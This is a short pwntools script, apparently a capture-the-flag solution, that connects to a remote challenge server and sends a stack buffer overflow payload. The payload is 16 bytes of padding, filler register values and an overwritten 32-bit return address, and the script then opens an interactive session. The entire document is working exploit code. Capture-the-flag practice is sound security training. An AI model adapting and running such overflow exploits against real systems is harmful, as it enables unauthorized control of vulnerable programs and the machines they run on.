from pwn import *

context(log_level='debug',os='linux',arch='i386')

r = remote('challenge.ctf.games',31053)

offset = 16
target = p32(0x080491f5)
eax = b"AAAA"
ebx = b"AAAA"
ecx = b"AAAA"

payload = offset * b'A' + eax + ebx + ecx + target
r.sendlineafter(b'Gimme some data!',payload)
r.interactive()